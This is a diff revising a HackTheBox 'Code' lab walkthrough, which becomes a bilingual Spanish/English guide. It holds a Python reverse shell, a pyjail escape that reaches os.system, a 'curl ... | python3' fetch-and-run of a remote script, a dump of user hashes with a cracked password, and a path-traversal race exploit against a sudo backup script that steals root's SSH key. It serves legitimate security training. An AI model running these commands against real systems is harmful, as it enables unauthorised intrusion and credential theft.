@@ -1,148 +1,167 @@
-1, Recon
-port scan 
-```
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
-|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
-|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
-5000/tcp open  http    Gunicorn 20.0.4
-|_http-title: Python Code Editor
-|_http-server-header: gunicorn/20.0.4
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# Code [Easy]
 
-```
+> **ES:** Máquina Linux fácil: un editor de Python online con lista negra burlable (pyjail) da shell, y un backup con `sudo` permite leer `/root`.
+> **EN:** Easy Linux machine: an online Python editor with a bypassable denylist (pyjail) gives shell, and a `sudo` backup tool allows reading `/root`.
 
-Page Check 
-![](images/Pasted%20image%2020250324093855.png)
-When I want to try to make a reverse shell here, I found there is a clean script here
-```
-export RHOST="10.10.16.12";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
-```
-Then I get the error message here
-```
-[](http://10.10.11.62:5000/#)
+| Campo | Valor |
+|-------|-------|
+| **Dificultad** | Easy |
+| **OS** | Linux |
+| **Estado** | Retired |
+| **Maker** | [verificar en app.hackthebox.com/machines/Code] |
+| **URL** | https://app.hackthebox.com/machines/Code |
+| **IP lab** | 10.10.11.62 |
+| **Fecha de resolución** | 2025-03-26 |
 
-Use of restricted keywords is not allowed.
-```
+---
 
-I guess we can try to make a `base64` encode to passby that
-```
-import base64
+## 🎯 Objetivo / Goal
 
-# Base64 编码的字符串
-encoded_code = "ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNi4xMiI7ZXhwb3J0IFJQT1JUPTQ0MztweXRob24zIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKSc="
+> **ES:** Conseguir `user.txt` y `root.txt` vía escape del sandbox Python → hash MD5 crackeado (martin) → abuso de `backy.sh` con `sudo`.
+> **EN:** Get `user.txt` and `root.txt` via Python sandbox escape → cracked MD5 hash (martin) → abusing `backy.sh` with `sudo`.
 
-# 解码为原始代码
-decoded_code = base64.b64decode(encoded_code).decode('utf-8')
+---
 
-print("🔍 解码后的代码如下：\n")
-print(decoded_code)
+## 🛠️ Herramientas usadas / Tools used
 
-# 执行代码（⚠️ 小心使用）
-exec(decoded_code)
+- [ ] nmap
+- [ ] python3 (pyjail escape, reverse shell)
+- [ ] sqlite3
+- [ ] hash crack (MD5 lookup / john / hashcat)
+- [ ] ssh
 
+---
+
+## 📋 Pasos / Steps
+
+### Paso 1 — Reconocimiento / Recon
+
+> **ES:** Solo SSH y un "Python Code Editor" (Gunicorn) en el puerto 5000.
+> **EN:** Only SSH and a "Python Code Editor" (Gunicorn) on port 5000.
+
+```bash
+nmap -sC -sV -oN nmap_init 10.10.11.62
 ```
 
-Very sadly, It still not worked.
-But there is still something interesting here, because of there is `login` and `register` label and services, that means there must be the database stored them, so I guess we can try to check the database here.
-```
-print([u.username for u in db.session.query(User).all()])
+**Resultado / Result:** 22/tcp OpenSSH 8.2p1 Ubuntu, 5000/tcp Gunicorn 20.0.4 "Python Code Editor". Captura del editor en `img/` (`img/image_20250323-192340.png`); captura legacy en `images/`.
 
-print([u.password for u in db.session.query(User).all()])
-```
+---
 
-Then we successfully get the result:
-```
-['development', 'martin'] 
-['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be']
-```
+### Paso 2 — Enumeración / Enumeration
 
-Then we can use hashcat to crack one of them
-```
-martin:nafeelswordsmaster
+> **ES:** El editor ejecuta código con filtro de palabras (`import`, `system`, `popen`, `subprocess`, `exec`, `open`, `read`, `eval`…). `print(dir())` muestra un entorno mínimo (`code`, `keyword`, `old_stdout`, `redirected_output`), típico pyjail. El filtro es por subcadena y se evade troceando strings (`"syste"+"m"`); un bypass con `base64`+`exec` no funcionó.
+> **EN:** The editor runs code with a word filter (`import`, `system`, `popen`, `subprocess`, `exec`, `open`, `read`, `eval`…). `print(dir())` shows a minimal environment (`code`, `keyword`, `old_stdout`, `redirected_output`), typical pyjail. The filter is substring-based and bypassed by splitting strings (`"syste"+"m"`); a `base64`+`exec` bypass did not work.
+
+```bash
+# Probar en el editor web:
+# print(dir())
+# print("".__class__.__base__.__subclasses__())
+# for index,i in enumerate("".__class__.__base__.__subclasses__()):
+#     if "o"+"s." in str(i): print(index, i)   # 132 <class 'os._wrap_close'>
 ```
 
-Then I guess we can use ssh to login, the fact told us I am right,
+**Resultado / Result:** La clase `os._wrap_close` (índice 132) expone `__globals__` con el módulo `os`. Captura del filtro en `img/image_20250324-192421.png`.
 
-2, shell as root
-There is a directory called `backup` here, and there is something in it.
-```
-martin@code:~/backups$ ls
-code_home_app-production_app_2024_August.tar.bz2  task.json
-martin@code:~/backups$ cat task.json 
-{
-        "destination": "/home/martin/backups/",
-        "multiprocessing": true,
-        "verbose_log": false,
-        "directories_to_archive": [
-                "/home/app-production/app"
-        ],
+---
 
-        "exclude": [
-                ".*"
-        ]
-}
-```
-Then I would want to check what `martin`  could do as root.
-```
-martin@code:~$ sudo -l
-Matching Defaults entries for martin on localhost:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+### Paso 3 — Acceso inicial (foothold) / Initial access
 
-User martin may run the following commands on localhost:
-    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+> **ES:** Desde `os._wrap_close.__init__.__globals__` se obtiene `os.system` y se descarga/ejecuta una reverse shell como `app-production`. Atajo alternativo: el propio editor permite consultar el ORM (`db.session.query(User)`), revelando usuarios y hashes MD5 directamente.
+> **EN:** From `os._wrap_close.__init__.__globals__` we get `os.system` and download/execute a reverse shell as `app-production`. Alternative shortcut: the editor itself allows querying the ORM (`db.session.query(User)`), revealing users and MD5 hashes directly.
 
-```
-When I want to check the source code of `backy.sh`, I can only see the messy code.
-This script is obfuscated and I cannot see the original code
-```
-martin@code:~$ sudo /usr/bin/backy.sh 
-Usage: /usr/bin/backy.sh <task.json>
+```bash
+# En el editor (fragmentado para evitar el filtro):
+# func = "".__class__.__base__.__subclasses__()[132].__init__.__globals__["syste"+"m"]
+# print(func("curl 10.10.16.31:9999/`whoami`"))   # -> app-production
+# print(func("curl 10.10.16.31/reverse-shell.py | python3"))
+nc -lvnp 9999
+python3 -m http.server 80
+# --- atajo vía ORM en el editor ---
+# print([u.username for u in db.session.query(User).all()])  # ['development', 'martin']
+# print([u.password for u in db.session.query(User).all()])
+# ['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be']
 ```
 
-Let's try to run it.
-```
-martin@code:~/backups$ sudo /usr/bin/backy.sh task.json 
-2025/03/23 23:46:10 🍀 backy 1.2
-2025/03/23 23:46:10 📋 Working with task.json ...
-2025/03/23 23:46:10 💤 Nothing to sync
-2025/03/23 23:46:10 📤 Archiving: [/home/app-production/app]
-2025/03/23 23:46:10 📥 To: /home/martin/backups ...
-2025/03/23 23:46:10 📦
+**Resultado / Result:** Reverse shell como `app-production` (`app-production@code:/home/app-production/app$`). `user.txt` de ese usuario legible en su home (formato: e235... ofuscado).
 
+---
 
-task.json
-{
- "destination": "/home/martin/backups/",
- "multiprocessing": true,
- "verbose_log": false,
- "directories_to_archive": [
-  "/home/app-production/app"
- ],
+### Paso 4 — Usuario (user.txt) / User
 
- "exclude": [
-  ".*"
- ]
-}
+> **ES:** La app usa `instance/database.db` (SQLite, tablas `code` y `user`) con hashes MD5; `development:development` y `martin:nafeelswordsmaster` (MD5 `3de6f30c4a09c27fc71932bfc68474be`, crackeado por lookup/diccionario). La clave se reutiliza en SSH.
+> **EN:** The app uses `instance/database.db` (SQLite, tables `code` and `user`) with MD5 hashes; `development:development` and `martin:nafeelswordsmaster` (MD5 `3de6f30c4a09c27fc71932bfc68474be`, cracked by lookup/dictionary). The password is reused over SSH.
+
+```bash
+file /home/app-production/app/instance/database.db  # SQLite 3.x
+sqlite3 database.db ".tables"            # code  user
+sqlite3 database.db "SELECT * FROM user;"
+# 1|development|759b74ce43947f5f4c91aeddc3e5bad3
+# 2|martin|3de6f30c4a09c27fc71932bfc68474be  -> nafeelswordsmaster
+ssh martin@10.10.11.62  # clave de laboratorio retirado
+cat /home/martin/user.txt
 ```
 
-The work flow I guess would be 
-`Back up and synchronize the specified path, and then save it to the destination directory`
-For root, same process but /root is blacklisted, 
-`you can trick the backy.sh but modifying the above task.json using /var/../root/ for directory to archive....`
+**Resultado / Result:** SSH como `martin` → `user.txt` (flag no reproducida).
+
+---
+
+### Paso 5 — Root (root.txt) / Privilege escalation
+
+> **ES:** `martin` corre `/usr/bin/backy.sh` con `sudo` sin contraseña. El script solo permite rutas bajo `/var/` y `/home/`, elimina `../` con un único `gsub` de `jq` y **reescribe el JSON antes de usarlo**: hay condición de carrera (reescribir `1.json` en bucle mientras se ejecuta el backup) para archivar `/var/../../../../root/` hacia `/home/martin/Backup`. El tarball resultante incluye `/root/root.txt` y `/root/.ssh/id_rsa` (login como root).
+> **EN:** `martin` runs `/usr/bin/backy.sh` with passwordless `sudo`. The script only allows paths under `/var/` and `/home/`, strips `../` with a single `jq` `gsub` and **rewrites the JSON before using it**: there is a race (rewrite `1.json` in a loop while the backup runs) to archive `/var/../../../../root/` into `/home/martin/Backup`. The resulting tarball includes `/root/root.txt` and `/root/.ssh/id_rsa` (login as root).
+
+```bash
+sudo -l  # (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+cat /usr/bin/backy.sh
+# --- lógica clave del script ---
+# allowed_paths=("/var/" "/home/")
+# updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./";""))' "$json_file")
+# /usr/bin/echo "$updated_json" > "$json_file"   # reescribe ANTES de validar/usar
+# ... valida prefijo /var/ u /home/ ...
+# /usr/bin/backy "$json_file"                    # backy 1.2 de vdbsh/backy
+# --- 1.json malicioso ---
+# {"destination": "/home/martin/Backup", "multiprocessing": true,
+#  "verbose_log": true, "directories_to_archive": ["/var/../../../../root/"]}
+# Sesión 1 (bucle de reescritura):
+for i in $(seq 100000); do echo <base64-de-1.json> | base64 -d > 1.json; done
+# Sesión 2:
+mkdir -p /home/martin/Backup
+sudo /usr/bin/backy.sh 1.json
+# 📤 Archiving: [/var/../../../../root] -> /home/martin/Backup ...
+# ... /root/root.txt ... /root/.ssh/id_rsa ...
+ls /home/martin/Backup/
+ssh -i id_rsa root@10.10.11.62
+cat /root/root.txt  # formato: 892e... (ofuscado)
 ```
-{
-    "destination": "/home/martin/backups/",
-    "multiprocessing": true,
-    "verbose_log": false,
-    "directories_to_archive": [
-        "/home/../../root"
-    ]
-}
-```
-Then just download it to your local machine and extract it, you can get the id_rsa of root shell, and you can also use it to login as root.
 
+**Resultado / Result:** Backup de `/root` (incluidos `root.txt` y claves SSH) copiado a directorio propio; `id_rsa` permite SSH como root. Técnica: path traversal + TOCTOU/race contra `backy` (vdbsh/backy).
 
+---
 
+## 🧠 Lo aprendido / Learned
+
+> **ES:** Las denylist en pyjails se evaden con introspección (`__class__`, `__globals__`); los hashes débiles (MD5) + reutilización dan salto lateral; validar paths con un solo `gsub` y reescribir el JSON antes de usarlo abre carreras.
+> **EN:** Pyjail denylists fall to introspection (`__class__`, `__globals__`); weak hashes (MD5) + reuse give lateral move; single-pass path sanitization with rewrite-before-use opens races.
+
+- [ ] Escape de pyjail vía `object.__subclasses__()` y `__globals__`
+- [ ] SQLite + MD5 crack + password reuse
+- [ ] Abuso de `sudo` script con traversal y condición de carrera
+
+---
+
+## 📚 Fuentes y Referencias / Sources
+
+- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
+- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: bypass base64 fallido, query ORM en el editor, `task.json` con `/home/../../root`) — wither/nota migrada
+- **Referencia técnica:** Proyecto backy usado por el binario — https://github.com/vdbsh/backy — vdbsh
+- **Fecha de acceso:** 2026-09-24
+- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
+
+---
+
+## ⚠️ Aviso Legal / Disclaimer
+
+> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
+> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.
+
+_Fecha de edición: 2026-09-24_
